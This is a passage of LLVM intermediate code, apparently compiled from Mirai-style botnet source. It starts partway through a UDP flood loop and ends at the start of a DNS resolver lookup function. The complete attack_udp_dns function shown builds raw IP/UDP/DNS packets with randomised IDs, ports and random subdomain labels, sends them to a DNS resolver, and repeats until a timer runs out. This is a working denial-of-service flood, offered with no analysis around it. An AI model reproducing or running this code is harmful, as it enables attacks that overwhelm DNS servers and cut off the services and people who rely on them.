; <label>:227:                                    ; preds = %222, %218
  %228 = load i16, i16* %18, align 2
  %229 = zext i16 %228 to i32
  %230 = icmp eq i32 %229, 65535
  br i1 %230, label %231, label %236

; <label>:231:                                    ; preds = %227
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  br label %236

; <label>:236:                                    ; preds = %231, %227
  %237 = load i16, i16* %19, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  br i1 %239, label %240, label %245

; <label>:240:                                    ; preds = %236
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  br label %245

; <label>:245:                                    ; preds = %240, %236
  %246 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %249 = bitcast %struct.iphdr* %248 to i16*
  %250 = call zeroext i16 @checksum_generic(i16* %249, i32 20)
  %251 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 7
  store i16 %250, i16* %252, align 2
  %253 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 3
  store i16 0, i16* %254, align 2
  %255 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %256 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %257 = bitcast %struct.udphdr* %256 to i8*
  %258 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 2
  %260 = load i16, i16* %259, align 2
  %261 = load i32, i32* %21, align 4
  %262 = sext i32 %261 to i64
  %263 = add i64 12, %262
  %264 = trunc i64 %263 to i32
  %265 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %255, i8* %257, i16 zeroext %260, i32 %264)
  %266 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %267 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %266, i32 0, i32 3
  store i16 %265, i16* %267, align 2
  %268 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %269 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %268, i32 0, i32 1
  %270 = load i16, i16* %269, align 2
  %271 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %272 = load i32, i32* %11, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %273
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %274, i32 0, i32 0
  %276 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %275, i32 0, i32 1
  store i16 %270, i16* %276, align 2
  %277 = load i32, i32* %12, align 4
  %278 = load i8*, i8** %26, align 8
  %279 = load i32, i32* %21, align 4
  %280 = sext i32 %279 to i64
  %281 = add i64 32, %280
  %282 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %283 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %284 = load i32, i32* %11, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %285
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %286, i32 0, i32 0
  %288 = bitcast %struct.sockaddr_in* %287 to %struct.sockaddr*
  store %struct.sockaddr* %288, %struct.sockaddr** %282, align 8
  %289 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %290 = load %struct.sockaddr*, %struct.sockaddr** %289, align 8
  %291 = call i64 @sendto(i32 %277, i8* %278, i64 %281, i32 16384, %struct.sockaddr* %290, i32 16)
  br label %292

; <label>:292:                                    ; preds = %245
  %293 = load i32, i32* %11, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %11, align 4
  br label %173

; <label>:295:                                    ; preds = %173
  %296 = call i64 @time(i64* null) #6
  %297 = load i32, i32* %22, align 4
  %298 = sext i32 %297 to i64
  %299 = icmp sgt i64 %296, %298
  br i1 %299, label %300, label %301

; <label>:300:                                    ; preds = %295
  br label %302

; <label>:301:                                    ; preds = %295
  br label %172

; <label>:302:                                    ; preds = %300, %72, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add nsw i64 %81, %83
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %25, align 4
  %86 = load i8*, i8** %22, align 8
  %87 = icmp eq i8* %86, null
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %5
  br label %414

; <label>:89:                                     ; preds = %5
  %90 = load i8*, i8** %22, align 8
  %91 = call i32 @util_strlen(i8* %90)
  store i32 %91, i32* %23, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %89
  br label %414

; <label>:95:                                     ; preds = %89
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 %101)
  br label %414

; <label>:103:                                    ; preds = %95
  store i32 0, i32* %11, align 4
  br label %104

; <label>:104:                                    ; preds = %265, %103
  %105 = load i32, i32* %11, align 4
  %106 = load i8, i8* %7, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %268

; <label>:109:                                    ; preds = %104
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %110 = call noalias i8* @calloc(i64 600, i64 1) #6
  %111 = load i8**, i8*** %13, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %29, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.udphdr*
  store %struct.udphdr* %123, %struct.udphdr** %30, align 8
  %124 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %125 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %124, i64 1
  %126 = bitcast %struct.udphdr* %125 to %struct.dnshdr*
  store %struct.dnshdr* %126, %struct.dnshdr** %31, align 8
  %127 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %128 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %127, i64 1
  %129 = bitcast %struct.dnshdr* %128 to i8*
  store i8* %129, i8** %32, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, 15
  %134 = or i8 %133, 64
  store i8 %134, i8* %131, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = and i8 %137, -16
  %139 = or i8 %138, 5
  store i8 %139, i8* %136, align 4
  %140 = load i8, i8* %14, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 1
  store i8 %140, i8* %142, align 1
  %143 = load i8, i8* %21, align 1
  %144 = zext i8 %143 to i64
  %145 = add i64 41, %144
  %146 = add i64 %145, 2
  %147 = load i32, i32* %23, align 4
  %148 = sext i32 %147 to i64
  %149 = add i64 %146, %148
  %150 = add i64 %149, 4
  %151 = trunc i64 %150 to i16
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 2
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %15, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 3
  store i16 %156, i16* %158, align 4
  %159 = load i8, i8* %16, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i8 %159, i8* %161, align 4
  %162 = load i8, i8* %17, align 1
  %163 = icmp ne i8 %162, 0
  br i1 %163, label %164, label %168

; <label>:164:                                    ; preds = %109
  %165 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 4
  store i16 %165, i16* %167, align 2
  br label %168

; <label>:168:                                    ; preds = %164, %109
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 6
  store i8 17, i8* %170, align 1
  %171 = load i32, i32* @LOCAL_ADDR, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 8
  store i32 %171, i32* %173, align 4
  %174 = load i32, i32* %24, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 9
  store i32 %174, i32* %176, align 4
  %177 = load i16, i16* %18, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %180 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %179, i32 0, i32 0
  store i16 %178, i16* %180, align 2
  %181 = load i16, i16* %19, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 1
  store i16 %182, i16* %184, align 2
  %185 = load i8, i8* %21, align 1
  %186 = zext i8 %185 to i64
  %187 = add i64 21, %186
  %188 = add i64 %187, 2
  %189 = load i32, i32* %23, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %188, %190
  %192 = add i64 %191, 4
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 2
  %197 = load i16, i16* %20, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %200 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %199, i32 0, i32 0
  store i16 %198, i16* %200, align 2
  %201 = call zeroext i16 @htons(i16 zeroext 256) #7
  %202 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %203 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %202, i32 0, i32 1
  store i16 %201, i16* %203, align 2
  %204 = call zeroext i16 @htons(i16 zeroext 1) #7
  %205 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %206 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %205, i32 0, i32 2
  store i16 %204, i16* %206, align 2
  %207 = load i8, i8* %21, align 1
  %208 = load i8*, i8** %32, align 8
  %209 = getelementptr inbounds i8, i8* %208, i32 1
  store i8* %209, i8** %32, align 8
  store i8 %207, i8* %208, align 1
  %210 = load i8, i8* %21, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %32, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %32, align 8
  %215 = load i8*, i8** %32, align 8
  store i8* %215, i8** %33, align 8
  %216 = load i8*, i8** %32, align 8
  %217 = getelementptr inbounds i8, i8* %216, i64 1
  %218 = load i8*, i8** %22, align 8
  %219 = load i32, i32* %23, align 4
  %220 = add nsw i32 %219, 1
  call void @util_memcpy(i8* %217, i8* %218, i32 %220)
  store i32 0, i32* %26, align 4
  br label %221

; <label>:221:                                    ; preds = %247, %168
  %222 = load i32, i32* %26, align 4
  %223 = load i32, i32* %23, align 4
  %224 = icmp slt i32 %222, %223
  br i1 %224, label %225, label %250

; <label>:225:                                    ; preds = %221
  %226 = load i8*, i8** %22, align 8
  %227 = load i32, i32* %26, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8, i8* %226, i64 %228
  %230 = load i8, i8* %229, align 1
  %231 = sext i8 %230 to i32
  %232 = icmp eq i32 %231, 46
  br i1 %232, label %233, label %243

; <label>:233:                                    ; preds = %225
  %234 = load i8, i8* %27, align 1
  %235 = load i8*, i8** %33, align 8
  store i8 %234, i8* %235, align 1
  store i8 0, i8* %27, align 1
  %236 = load i8, i8* %28, align 1
  %237 = add i8 %236, 1
  store i8 %237, i8* %28, align 1
  %238 = load i8*, i8** %32, align 8
  %239 = load i32, i32* %26, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds i8, i8* %238, i64 %240
  %242 = getelementptr inbounds i8, i8* %241, i64 1
  store i8* %242, i8** %33, align 8
  br label %246

; <label>:243:                                    ; preds = %225
  %244 = load i8, i8* %27, align 1
  %245 = add i8 %244, 1
  store i8 %245, i8* %27, align 1
  br label %246

; <label>:246:                                    ; preds = %243, %233
  br label %247

; <label>:247:                                    ; preds = %246
  %248 = load i32, i32* %26, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %26, align 4
  br label %221

; <label>:250:                                    ; preds = %221
  %251 = load i8, i8* %27, align 1
  %252 = load i8*, i8** %33, align 8
  store i8 %251, i8* %252, align 1
  %253 = load i8*, i8** %32, align 8
  %254 = load i32, i32* %23, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  %257 = getelementptr inbounds i8, i8* %256, i64 2
  %258 = bitcast i8* %257 to %struct.grehdr*
  store %struct.grehdr* %258, %struct.grehdr** %34, align 8
  %259 = call zeroext i16 @htons(i16 zeroext 1) #7
  %260 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %261 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %260, i32 0, i32 0
  store i16 %259, i16* %261, align 2
  %262 = call zeroext i16 @htons(i16 zeroext 1) #7
  %263 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %264 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  br label %265

; <label>:265:                                    ; preds = %250
  %266 = load i32, i32* %11, align 4
  %267 = add nsw i32 %266, 1
  store i32 %267, i32* %11, align 4
  br label %104

; <label>:268:                                    ; preds = %104
  br label %269

; <label>:269:                                    ; preds = %413, %268
  store i32 0, i32* %11, align 4
  br label %270

; <label>:270:                                    ; preds = %404, %269
  %271 = load i32, i32* %11, align 4
  %272 = load i8, i8* %7, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp slt i32 %271, %273
  br i1 %274, label %275, label %407

; <label>:275:                                    ; preds = %270
  %276 = load i8**, i8*** %13, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8*, i8** %276, i64 %278
  %280 = load i8*, i8** %279, align 8
  store i8* %280, i8** %35, align 8
  %281 = load i8*, i8** %35, align 8
  %282 = bitcast i8* %281 to %struct.iphdr*
  store %struct.iphdr* %282, %struct.iphdr** %36, align 8
  %283 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i64 1
  %285 = bitcast %struct.iphdr* %284 to %struct.udphdr*
  store %struct.udphdr* %285, %struct.udphdr** %37, align 8
  %286 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i64 1
  %288 = bitcast %struct.udphdr* %287 to %struct.dnshdr*
  store %struct.dnshdr* %288, %struct.dnshdr** %38, align 8
  %289 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %290 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %289, i64 1
  %291 = bitcast %struct.dnshdr* %290 to i8*
  %292 = getelementptr inbounds i8, i8* %291, i64 1
  store i8* %292, i8** %39, align 8
  %293 = load i16, i16* %15, align 2
  %294 = zext i16 %293 to i32
  %295 = icmp eq i32 %294, 65535
  br i1 %295, label %296, label %302

; <label>:296:                                    ; preds = %275
  %297 = call i32 @rand_next()
  %298 = and i32 %297, 65535
  %299 = trunc i32 %298 to i16
  %300 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 4
  br label %302

; <label>:302:                                    ; preds = %296, %275
  %303 = load i16, i16* %18, align 2
  %304 = zext i16 %303 to i32
  %305 = icmp eq i32 %304, 65535
  br i1 %305, label %306, label %312

; <label>:306:                                    ; preds = %302
  %307 = call i32 @rand_next()
  %308 = and i32 %307, 65535
  %309 = trunc i32 %308 to i16
  %310 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 0
  store i16 %309, i16* %311, align 2
  br label %312

; <label>:312:                                    ; preds = %306, %302
  %313 = load i16, i16* %19, align 2
  %314 = zext i16 %313 to i32
  %315 = icmp eq i32 %314, 65535
  br i1 %315, label %316, label %322

; <label>:316:                                    ; preds = %312
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 1
  store i16 %319, i16* %321, align 2
  br label %322

; <label>:322:                                    ; preds = %316, %312
  %323 = load i16, i16* %20, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 65535
  br i1 %325, label %326, label %332

; <label>:326:                                    ; preds = %322
  %327 = call i32 @rand_next()
  %328 = and i32 %327, 65535
  %329 = trunc i32 %328 to i16
  %330 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %331 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %330, i32 0, i32 0
  store i16 %329, i16* %331, align 2
  br label %332

; <label>:332:                                    ; preds = %326, %322
  %333 = load i8*, i8** %39, align 8
  %334 = load i8, i8* %21, align 1
  %335 = zext i8 %334 to i32
  call void @rand_alpha_str(i8* %333, i32 %335)
  %336 = load i8*, i8** %39, align 8
  %337 = load i8, i8* %21, align 1
  %338 = zext i8 %337 to i64
  %339 = getelementptr inbounds i8, i8* %336, i64 %338
  store i8 0, i8* %339, align 1
  %340 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 7
  store i16 0, i16* %341, align 2
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = bitcast %struct.iphdr* %342 to i16*
  %344 = call zeroext i16 @checksum_generic(i16* %343, i32 20)
  %345 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 7
  store i16 %344, i16* %346, align 2
  %347 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 3
  store i16 0, i16* %348, align 2
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %351 = bitcast %struct.udphdr* %350 to i8*
  %352 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 2
  %354 = load i16, i16* %353, align 2
  %355 = load i8, i8* %21, align 1
  %356 = zext i8 %355 to i64
  %357 = add i64 21, %356
  %358 = add i64 %357, 2
  %359 = load i32, i32* %23, align 4
  %360 = sext i32 %359 to i64
  %361 = add i64 %358, %360
  %362 = add i64 %361, 4
  %363 = trunc i64 %362 to i32
  %364 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %349, i8* %351, i16 zeroext %354, i32 %363)
  %365 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %366 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %365, i32 0, i32 3
  store i16 %364, i16* %366, align 2
  %367 = load i32, i32* %24, align 4
  %368 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %369 = load i32, i32* %11, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 0
  %373 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %372, i32 0, i32 2
  %374 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %373, i32 0, i32 0
  store i32 %367, i32* %374, align 4
  %375 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %376 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %375, i32 0, i32 1
  %377 = load i16, i16* %376, align 2
  %378 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %379 = load i32, i32* %11, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 0
  %383 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %382, i32 0, i32 1
  store i16 %377, i16* %383, align 2
  %384 = load i32, i32* %12, align 4
  %385 = load i8*, i8** %35, align 8
  %386 = load i8, i8* %21, align 1
  %387 = zext i8 %386 to i64
  %388 = add i64 41, %387
  %389 = add i64 %388, 2
  %390 = load i32, i32* %23, align 4
  %391 = sext i32 %390 to i64
  %392 = add i64 %389, %391
  %393 = add i64 %392, 4
  %394 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %395 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %396 = load i32, i32* %11, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 0
  %400 = bitcast %struct.sockaddr_in* %399 to %struct.sockaddr*
  store %struct.sockaddr* %400, %struct.sockaddr** %394, align 8
  %401 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %402 = load %struct.sockaddr*, %struct.sockaddr** %401, align 8
  %403 = call i64 @sendto(i32 %384, i8* %385, i64 %393, i32 16384, %struct.sockaddr* %402, i32 16)
  br label %404

; <label>:404:                                    ; preds = %332
  %405 = load i32, i32* %11, align 4
  %406 = add nsw i32 %405, 1
  store i32 %406, i32* %11, align 4
  br label %270

; <label>:407:                                    ; preds = %270
  %408 = call i64 @time(i64* null) #6
  %409 = load i32, i32* %25, align 4
  %410 = sext i32 %409 to i64
  %411 = icmp sgt i64 %408, %410
  br i1 %411, label %412, label %413

; <label>:412:                                    ; preds = %407
  br label %414

; <label>:413:                                    ; preds = %407
  br label %269

; <label>:414:                                    ; preds = %412, %100, %94, %88
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 41)
